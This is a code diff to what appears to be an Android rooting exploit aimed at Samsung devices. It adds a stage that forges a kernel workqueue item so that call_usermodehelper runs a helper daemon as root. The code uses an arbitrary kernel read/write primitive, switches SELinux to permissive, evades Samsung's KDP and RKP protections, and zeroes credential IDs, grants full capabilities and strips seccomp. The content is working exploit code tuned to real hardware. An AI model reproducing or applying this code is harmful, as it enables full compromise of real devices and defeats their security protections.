@@ -1,5 +1,477 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
+#include <sys/un.h>
+
+#define DEFAULT_ROOT_HELPER_PATH "/data/local/tmp/ghostlock-helper"
+
+static const char *select_root_helper_path(void) {
+  const char *from_app = getenv("GHOSTLOCK_HELPER_PATH");
+  if (from_app && from_app[0] && access(from_app, X_OK) == 0) {
+    return from_app;
+  }
+  if (access(DEFAULT_ROOT_HELPER_PATH, X_OK) == 0) {
+    return DEFAULT_ROOT_HELPER_PATH;
+  }
+  if (from_app && from_app[0]) {
+    return from_app;
+  }
+  return DEFAULT_ROOT_HELPER_PATH;
+}
+
+/* Workqueue-UMH root stage for KDP_CRED devices (Samsung): instead of
+ * rewriting a task's cred (KDP panics on that), forge a work item into
+ * system_unbound_wq whose func is call_usermodehelper_exec_work; the
+ * kernel runs the helper with init creds.  Layout/offsets replicated from
+ * the calibrated Samsung payload flow. */
+
+struct umh_subprocess_info {
+  uint8_t work[48];
+  uint64_t complete;
+  uint64_t path;
+  uint64_t argv;
+  uint64_t envp;
+  int32_t wait;
+  int32_t retval;
+  uint64_t init;
+  uint64_t cleanup;
+  uint64_t data;
+};
+
+struct umh_completion {
+  uint32_t done;
+  uint32_t pad0;
+  uint32_t lock;
+  uint32_t pad1;
+  uint64_t next;
+  uint64_t prev;
+};
+
+struct umh_kernel_data {
+  struct umh_completion completion;
+  char path[256];
+  /* The stable shell UMH path passes the generated script as its argument.
+   * Keep the stable scratch layout: changing this field to a compact helper
+   * layout changes every following pointer and regresses the
+   * Fold6 immediately after completion.done became 1. */
+  char arg[320];
+  char uid[16];
+  uint64_t argv[4];
+  uint64_t envp[1];
+};
+
+_Static_assert(sizeof(struct umh_subprocess_info) == 112,
+               "subprocess_info layout");
+_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");
+_Static_assert(offsetof(struct umh_kernel_data, path) == 32,
+               "umh path layout");
+_Static_assert(sizeof(struct umh_kernel_data) == 0x298,
+               "umh data layout");
+_Static_assert(offsetof(struct umh_kernel_data, argv) == 0x270,
+               "umh argv layout");
+
+static int wake_system_unbound(void) {
+  char slave_name[128];
+  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
+  if (master_fd < 0 || grantpt(master_fd) != 0 ||
+      unlockpt(master_fd) != 0 ||
+      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
+    if (master_fd >= 0) {
+      close(master_fd);
+    }
+    return 0;
+  }
+
+  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
+  if (slave_fd < 0) {
+    close(master_fd);
+    return 0;
+  }
+  int master_close = close(master_fd);
+  int slave_close = close(slave_fd);
+  return master_close == 0 && slave_close == 0;
+}
+
+/* The CFI stage establishes the configfs primitive, then the UMH stage uses
+ * the pipe-backed physical R/W path for direct-map objects.  This is the
+ * path used for slab-resident workqueue objects; configfs alone can
+ * read the .data pointer but reboots when it dereferences the returned pwq. */
+static uint64_t umh_read64(int fd, uintptr_t addr) {
+  return kernel_read64(fd, addr);
+}
+
+static uint32_t umh_read32(int fd, uintptr_t addr) {
+  return (uint32_t)kernel_read64(fd, addr);
+}
+
+static int umh_write(int fd, uintptr_t addr, const void *data, size_t len) {
+  return kernel_write_data(fd, addr, data, len) == (ssize_t)len;
+}
+
+/* Keep the UMH workqueue probe separate from the older root helpers below.
+ * The calibrated payload rejects non-direct-map targets before touching
+ * the arbitrary R/W primitive.  Its scalar helper keeps an eight-byte
+ * transfer width and truncates when the caller needs a 32-bit field.  Log
+ * the syscall result as well: a missing "end" marker means the target access
+ * itself killed/restarted the kernel. */
+static int umh_target_ok(uintptr_t addr, size_t len, const char *tag) {
+  if (len == 0 || !is_direct_ptr(addr) ||
+      len - 1 > UINTPTR_MAX - addr ||
+      !is_direct_ptr(addr + len - 1)) {
+    pr_error("root umh invalid target tag=%s addr=%016zx len=%zu\n",
+             tag, addr, len);
+    return 0;
+  }
+  return 1;
+}
+
+static int umh_read64_checked(int fd, uintptr_t addr, const char *tag,
+                              uint64_t *out, int trace) {
+  if (out == NULL) {
+    pr_error("root umh read64 missing output tag=%s addr=%016zx\n",
+             tag, addr);
+    return 0;
+  }
+  *out = 0;
+  if (!umh_target_ok(addr, sizeof(*out), tag)) {
+    return 0;
+  }
+  if (trace) {
+    pr_info("root umh read64 begin tag=%s addr=%016zx\n", tag, addr);
+  }
+  errno = 0;
+  int ok = pipe_phys_read_data(fd, addr, out, sizeof(*out));
+  ssize_t n = ok ? (ssize_t)sizeof(*out) : -1;
+  int read_errno = errno;
+  if (trace || n != (ssize_t)sizeof(*out)) {
+    pr_info("root umh read64 end tag=%s addr=%016zx ret=%zd value=%016llx "
+            "errno=%d\n",
+            tag, addr, n, (unsigned long long)*out, read_errno);
+  }
+  if (n != (ssize_t)sizeof(*out)) {
+    pr_error("root umh read64 failed tag=%s addr=%016zx ret=%zd errno=%d\n",
+             tag, addr, n, read_errno);
+    return 0;
+  }
+  return 1;
+}
+
+static int umh_read32_checked(int fd, uintptr_t addr, const char *tag,
+                              uint32_t *out, int trace) {
+  if (out == NULL) {
+    pr_error("root umh read32 missing output tag=%s addr=%016zx\n",
+             tag, addr);
+    return 0;
+  }
+  *out = 0;
+  uint64_t raw = 0;
+  if (!umh_target_ok(addr, sizeof(raw), tag)) {
+    return 0;
+  }
+  if (trace) {
+    pr_info("root umh read32 begin tag=%s addr=%016zx\n", tag, addr);
+  }
+  errno = 0;
+  /* A native 4-byte request corrupts the configfs page/position state on
+   * this kernel and reboots the device.  Read a qword, then
+   * consume its low half for 32-bit fields. */
+  int ok = pipe_phys_read_data(fd, addr, &raw, sizeof(raw));
+  ssize_t n = ok ? (ssize_t)sizeof(raw) : -1;
+  int read_errno = errno;
+  *out = (uint32_t)raw;
+  if (trace || n != (ssize_t)sizeof(raw)) {
+    pr_info("root umh read32 end tag=%s addr=%016zx ret=%zd raw=%016llx "
+            "value=%08x errno=%d\n",
+            tag, addr, n, (unsigned long long)raw, *out, read_errno);
+  }
+  if (n != (ssize_t)sizeof(raw)) {
+    pr_error("root umh read32 failed tag=%s addr=%016zx ret=%zd errno=%d\n",
+             tag, addr, n, read_errno);
+    return 0;
+  }
+  return 1;
+}
+
+static int umh_write_checked(int fd, uintptr_t addr, const void *data,
+                             size_t len, const char *tag) {
+  if (data == NULL || !umh_target_ok(addr, len, tag)) {
+    if (data == NULL) {
+      pr_error("root umh write missing data tag=%s addr=%016zx len=%zu\n",
+               tag, addr, len);
+    }
+    return 0;
+  }
+  pr_info("root umh write begin tag=%s addr=%016zx len=%zu\n",
+          tag, addr, len);
+  errno = 0;
+  int ok = pipe_phys_write_data(fd, addr, data, len);
+  ssize_t n = ok ? (ssize_t)len : -1;
+  int write_errno = errno;
+  pr_info("root umh write end tag=%s addr=%016zx len=%zu ret=%zd errno=%d\n",
+          tag, addr, len, n, write_errno);
+  if (n != (ssize_t)len) {
+    pr_error("root umh write failed tag=%s addr=%016zx len=%zu ret=%zd "
+             "errno=%d\n",
+             tag, addr, len, n, write_errno);
+    return 0;
+  }
+  return 1;
+}
+
+int install_workqueue_umh_root(int fd, const char *helper_path,
+                               const char *helper_arg) {
+  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
+  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
+  struct umh_kernel_data umh_data;
+  memset(&umh_data, 0, sizeof(umh_data));
+
+  /* Permissive first, then immediately queue the work — keep
+   * the permissive window as short as possible (RKP scans). */
+  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
+  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
+  pr_info("root umh start page=%016zx selinux=%016zx wq_slot=%016zx "
+          "work=%016zx data=%016zx\n",
+          page_base, selinux_addr, wq_slot, fake_work_addr, umh_data_addr);
+  if (!is_direct_ptr(selinux_addr) || !is_direct_ptr(wq_slot) ||
+      !is_direct_ptr(fake_work_addr) || !is_direct_ptr(umh_data_addr)) {
+    pr_error("root umh invalid staging address selinux=%016zx "
+             "wq_slot=%016zx work=%016zx data=%016zx\n",
+             selinux_addr, wq_slot, fake_work_addr, umh_data_addr);
+    return 0;
+  }
+  uint8_t permissive = 0;
+  int selinux_write = umh_write_checked(
+      fd, selinux_addr, &permissive, sizeof(permissive),
+      "selinux.enforcing");
+  pr_info("root umh selinux write addr=%016zx ok=%d\n",
+          selinux_addr, selinux_write);
+  if (!selinux_write) {
+    pr_error("root umh selinux write failed\n");
+    return 0;
+  }
+  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", helper_path) >=
+      (int)sizeof(umh_data.path)) {
+    pr_error("root umh helper path too long\n");
+    return 0;
+  }
+  int arg_len = snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", helper_arg);
+  if (arg_len < 0 || arg_len >= (int)sizeof(umh_data.arg)) {
+    pr_error("root umh helper argument too long\n");
+    return 0;
+  }
+  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());
+  uintptr_t completion_addr =
+      umh_data_addr + offsetof(struct umh_kernel_data, completion);
+  uintptr_t wait_list_addr =
+      completion_addr + offsetof(struct umh_completion, next);
+  uintptr_t path_addr =
+      umh_data_addr + offsetof(struct umh_kernel_data, path);
+  uintptr_t arg_addr =
+      umh_data_addr + offsetof(struct umh_kernel_data, arg);
+  uintptr_t uid_addr =
+      umh_data_addr + offsetof(struct umh_kernel_data, uid);
+  uintptr_t argv_addr =
+      umh_data_addr + offsetof(struct umh_kernel_data, argv);
+  uintptr_t envp_addr =
+      umh_data_addr + offsetof(struct umh_kernel_data, envp);
+  umh_data.completion.next = wait_list_addr;
+  umh_data.completion.prev = wait_list_addr;
+  umh_data.argv[0] = path_addr;
+  umh_data.argv[1] = arg_addr;
+  /* A direct --umh helper receives the original shell UID as argv[2].  The
+   * generated shell script remains a two-entry argv and therefore leaves it
+   * NULL. */
+  umh_data.argv[2] = strcmp(helper_arg, "--umh") == 0 ? uid_addr : 0;
+  umh_data.argv[3] = 0;
+  umh_data.envp[0] = 0;
+  pr_info("root umh target path=%s arg=%s uid=%s argv2=%016zx\n",
+          umh_data.path, umh_data.arg, umh_data.uid,
+          (uintptr_t)umh_data.argv[2]);
+  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);
+
+  uint64_t wq_value = 0;
+  if (!umh_read64_checked(fd, wq_slot, "system_unbound_wq", &wq_value, 1)) {
+    return 0;
+  }
+  uintptr_t wq = (uintptr_t)wq_value;
+  pr_info("root umh read wq slot=%016zx value=%016zx\n", wq_slot, wq);
+  if (!is_direct_ptr(wq)) {
+    pr_error("root umh invalid workqueue pointer wq=%016zx\n", wq);
+    return 0;
+  }
+
+  uint64_t pwq_value = 0;
+  if (!umh_read64_checked(fd, wq + WQ_DFL_PWQ_OFF, "wq.dfl_pwq",
+                          &pwq_value, 1)) {
+    return 0;
+  }
+  uintptr_t pwq = (uintptr_t)pwq_value;
+  pr_info("root umh read pwq addr=%016zx value=%016zx\n",
+          wq + WQ_DFL_PWQ_OFF, pwq);
+  if (!is_direct_ptr(pwq)) {
+    pr_error("root umh invalid pwq pointer pwq=%016zx\n", pwq);
+    return 0;
+  }
+
+  uint64_t pool_value = 0;
+  if (!umh_read64_checked(fd, pwq + PWQ_POOL_OFF, "pwq.pool",
+                          &pool_value, 1)) {
+    return 0;
+  }
+  uintptr_t pool = (uintptr_t)pool_value;
+  pr_info("root umh read pool addr=%016zx value=%016zx\n",
+          pwq + PWQ_POOL_OFF, pool);
+  if (!is_direct_ptr(pool)) {
+    pr_error("root umh invalid pool pointer pool=%016zx\n", pool);
+    return 0;
+  }
+
+  /* Validate the pwq owner immediately after the
+   * pool pointer, before probing worker-pool state. */
+  uint64_t pwq_wq_value = 0;
+  if (!umh_read64_checked(fd, pwq + PWQ_WQ_OFF, "pwq.wq",
+                          &pwq_wq_value, 1)) {
+    return 0;
+  }
+  uintptr_t pwq_wq = (uintptr_t)pwq_wq_value;
+  pr_info("root umh read pwq->wq addr=%016zx value=%016zx\n",
+          pwq + PWQ_WQ_OFF, pwq_wq);
+  if (pwq_wq != wq) {
+    pr_error("root umh workqueue owner mismatch wq=%016zx pwq_wq=%016zx\n",
+             wq, pwq_wq);
+    return 0;
+  }
+
+  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
+  uint64_t list_next = 0;
+  uint64_t list_prev = 0;
+  uint32_t nr_idle = 0;
+  for (int i = 0; i < 200; i++) {
+    if (!umh_read64_checked(fd, worklist, "pool.worklist.next", &list_next,
+                            0) ||
+        !umh_read64_checked(fd, worklist + sizeof(uint64_t),
+                            "pool.worklist.prev", &list_prev, 0) ||
+        !umh_read32_checked(fd, pool + POOL_NR_IDLE_OFF, "pool.nr_idle",
+                            &nr_idle, 0)) {
+      pr_error("root umh pool probe read failed pool=%016zx worklist=%016zx\n",
+               pool, worklist);
+      return 0;
+    }
+    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
+      break;
+    }
+    usleep(1000);
+  }
+  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
+    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
+             "head=%016zx idle=%u\n",
+             pool, (unsigned long long)list_next,
+             (unsigned long long)list_prev, worklist, nr_idle);
+    return 0;
+  }
+  pr_info("root umh pool idle pool=%016zx worklist=%016zx nr_idle=%u\n",
+          pool, worklist, nr_idle);
+
+  uint32_t color = 0;
+  uint32_t refcnt = 0;
+  uint32_t nr_active = 0;
+  uint32_t max_active = 0;
+  if (!umh_read32_checked(fd, pwq + PWQ_WORK_COLOR_OFF, "pwq.work_color",
+                          &color, 1) ||
+      !umh_read32_checked(fd, pwq + PWQ_REFCNT_OFF, "pwq.refcnt", &refcnt,
+                          1) ||
+      !umh_read32_checked(fd, pwq + PWQ_NR_ACTIVE_OFF, "pwq.nr_active",
+                          &nr_active, 1) ||
+      !umh_read32_checked(fd, pwq + PWQ_MAX_ACTIVE_OFF, "pwq.max_active",
+                          &max_active, 1)) {
+    return 0;
+  }
+  pr_info("root umh pwq state color=%u refcnt=%u active=%u/%u\n",
+          color, refcnt, nr_active, max_active);
+  if (color >= 16 || refcnt == 0 || nr_active >= max_active) {
+    pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
+             color, refcnt, nr_active, max_active);
+    return 0;
+  }
+
+  uintptr_t inflight_addr =
+      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
+  uint32_t nr_inflight = 0;
+  if (!umh_read32_checked(fd, inflight_addr, "pwq.nr_in_flight", &nr_inflight,
+                          1)) {
+    return 0;
+  }
+  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
+  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
+  struct umh_subprocess_info fake;
+  memset(&fake, 0, sizeof(fake));
+  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
+  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
+  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
+         &worklist, sizeof(worklist));
+  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func,
+         sizeof(umh_work_func));
+  fake.complete = completion_addr;
+  fake.path = path_addr;
+  fake.argv = argv_addr;
+  fake.envp = envp_addr;
+
+  uint32_t nr_inflight_want = nr_inflight + 1;
+  uint32_t nr_active_want = nr_active + 1;
+  uint32_t refcnt_want = refcnt + 1;
+  int data_write = umh_write_checked(
+      fd, umh_data_addr, &umh_data, sizeof(umh_data), "umh.data");
+  int work_write = umh_write_checked(
+      fd, fake_work_addr, &fake, sizeof(fake), "umh.work");
+  int counters_write =
+      umh_write_checked(fd, inflight_addr, &nr_inflight_want,
+                        sizeof(nr_inflight_want), "pwq.nr_in_flight") &&
+      umh_write_checked(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active_want,
+                        sizeof(nr_active_want), "pwq.nr_active") &&
+      umh_write_checked(fd, pwq + PWQ_REFCNT_OFF, &refcnt_want,
+                        sizeof(refcnt_want), "pwq.refcnt");
+  int list_prev_write = umh_write_checked(
+      fd, worklist + sizeof(uint64_t), &fake_entry, sizeof(fake_entry),
+      "pool.worklist.prev");
+  int list_next_write = list_prev_write && umh_write_checked(
+      fd, worklist, &fake_entry, sizeof(fake_entry), "pool.worklist.next");
+  pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
+          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
+          "writes=%d/%d/%d/%d/%d\n",
+          wq, pwq, pool, fake_work_addr, fake_entry, color,
+          nr_inflight, nr_active, refcnt, data_write, work_write,
+          counters_write, list_prev_write, list_next_write);
+  if (!data_write || !work_write || !counters_write || !list_next_write) {
+    return 0;
+  }
+
+  uint32_t complete_done = 0;
+  int wake_ok = 0;
+  for (int i = 0; i < 8 && !complete_done; i++) {
+    wake_ok |= wake_system_unbound();
+    for (int j = 0; j < 250; j++) {
+      if (!umh_read32_checked(fd, completion_addr, "umh.completion.done",
+                              &complete_done, 0)) {
+        return 0;
+      }
+      if (complete_done) {
+        break;
+      }
+      usleep(1000);
+    }
+  }
+
+  uint32_t retval_value = 0;
+  if (!umh_read32_checked(
+          fd, fake_work_addr + offsetof(struct umh_subprocess_info, retval),
+          "umh.subprocess.retval", &retval_value, 1)) {
+    return 0;
+  }
+  int32_t umh_retval = (int32_t)retval_value;
+  pr_info("root umh result wake=%d complete=%u retval=%d\n",
+          wake_ok, complete_done, umh_retval);
+  return complete_done != 0;
+}
+
 
 int root_child_done;
 uint8_t selinux_before = 0xff;
@@ -133,7 +605,7 @@ int collect_root_child(void) {
 uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
   uint64_t head = data_addr(INIT_TASK_TASKS);
   uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
-  uint64_t entry = pipe_read64(fd, head);
+  uint64_t entry = umh_read64(fd, head);
   task_walk_iters = 0;
   task_walk_last_entry = 0;
   task_walk_last_pid = 0;
@@ -150,8 +622,8 @@ uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
     }
 
     uint64_t task = entry - TASK_TASKS_OFF;
-    uint32_t pid = pipe_read32(fd, task + TASK_PID_OFF);
-    uint32_t tgid = pipe_read32(fd, task + TASK_TGID_OFF);
+    uint32_t pid = umh_read32(fd, task + TASK_PID_OFF);
+    uint32_t tgid = umh_read32(fd, task + TASK_TGID_OFF);
     task_walk_last_pid = pid;
     task_walk_last_tgid = tgid;
     char comm[TASK_COMM_LEN + 1];
@@ -165,7 +637,7 @@ uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
       return task;
     }
 
-    entry = pipe_read64(fd, task + TASK_TASKS_OFF);
+    entry = umh_read64(fd, task + TASK_TASKS_OFF);
   }
 
   return 0;
@@ -177,12 +649,12 @@ int patch_cred_identity(int fd, uintptr_t cred) {
   }
 
   uint64_t zero_ids[4] = {0};
-  if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {
+  if (!umh_write(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {
     return 0;
   }
 
   uint32_t securebits = 0;
-  if (!pipe_phys_write_data(
+  if (!umh_write(
       fd, cred + CRED_SECUREBITS_OFF, &securebits, sizeof(securebits))) {
     return 0;
   }
@@ -190,7 +662,7 @@ int patch_cred_identity(int fd, uintptr_t cred) {
   uint64_t caps[CRED_CAP_WORDS] = {
     CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
   };
-  if (!pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
+  if (!umh_write(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
     return 0;
   }
 
@@ -212,7 +684,7 @@ int patch_cred_identity(int fd, uintptr_t cred) {
 }
 
 int patch_cred_sid(int fd, uintptr_t cred) {
-  uint64_t security = pipe_read64(fd, cred + CRED_SECURITY_OFF);
+  uint64_t security = umh_read64(fd, cred + CRED_SECURITY_OFF);
   if (!is_direct_ptr(security)) {
     pr_info("root bad cred security cred=%016llx security=%016llx\n",
             (unsigned long long)cred, (unsigned long long)security);
@@ -224,7 +696,7 @@ int patch_cred_sid(int fd, uintptr_t cred) {
   };
   uintptr_t osid_addr =
     security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
-  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));
+  return umh_write(fd, osid_addr, sid_pair, sizeof(sid_pair));
 }
 
 int patch_cred_object(int fd, uintptr_t cred) {
@@ -240,12 +712,12 @@ static int patch_task_seccomp(int fd, uintptr_t task) {
   uintptr_t atomic_flags_addr = task + TASK_ATOMIC_FLAGS_OFF;
   uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;
 
-  uint64_t flags_before = pipe_read64(fd, flags_addr);
-  uint64_t atomic_before = pipe_read64(fd, atomic_flags_addr);
-  uint32_t mode_before = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
+  uint64_t flags_before = umh_read64(fd, flags_addr);
+  uint64_t atomic_before = umh_read64(fd, atomic_flags_addr);
+  uint32_t mode_before = umh_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
   uint32_t count_before =
-    pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
-  uint64_t filter_before = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);
+    umh_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
+  uint64_t filter_before = umh_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);
 
   uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
   uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
@@ -259,18 +731,18 @@ static int patch_task_seccomp(int fd, uintptr_t task) {
   if (atomic_want != atomic_before) {
     ok &= pipe_write64(fd, atomic_flags_addr, atomic_want);
   }
-  ok &= pipe_phys_write_data(
+  ok &= umh_write(
     fd, seccomp_addr + SECCOMP_MODE_OFF, &zero32, sizeof(zero32));
-  ok &= pipe_phys_write_data(
+  ok &= umh_write(
     fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &zero32, sizeof(zero32));
-  ok &= pipe_phys_write_data(
+  ok &= umh_write(
     fd, seccomp_addr + SECCOMP_FILTER_OFF, &zero64, sizeof(zero64));
 
-  uint64_t flags_after = pipe_read64(fd, flags_addr);
-  uint64_t atomic_after = pipe_read64(fd, atomic_flags_addr);
-  uint32_t mode_after = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
-  uint32_t count_after = pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
-  uint64_t filter_after = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);
+  uint64_t flags_after = umh_read64(fd, flags_addr);
+  uint64_t atomic_after = umh_read64(fd, atomic_flags_addr);
+  uint32_t mode_after = umh_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
+  uint32_t count_after = umh_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
+  uint64_t filter_after = umh_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);
 
   pr_info("root seccomp patched ok=%d flags=%016llx/%016llx "
           "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
@@ -289,6 +761,16 @@ static int patch_task_seccomp(int fd, uintptr_t task) {
 }
 
 int install_android_root(int fd) {
+  if (active_offsets && active_offsets->umh_root) {
+    /* Match Root My Galaxy: UMH directly starts the root helper daemon.  The
+     * daemon creates temp_su.sock; the shell UID client connects only after
+    * this function observes that socket. */
+    unlink("/data/local/tmp/temp_su.sock");
+    const char *helper_path = select_root_helper_path();
+    pr_info("root UMH helper selected path=%s\n", helper_path);
+    return install_workqueue_umh_root(
+        fd, helper_path, "--umh");
+  }
   root_uid_before = getuid();
   if (!spawn_root_child()) {
     pr_info("root spawn failed child=%d\n", root_child_pid);
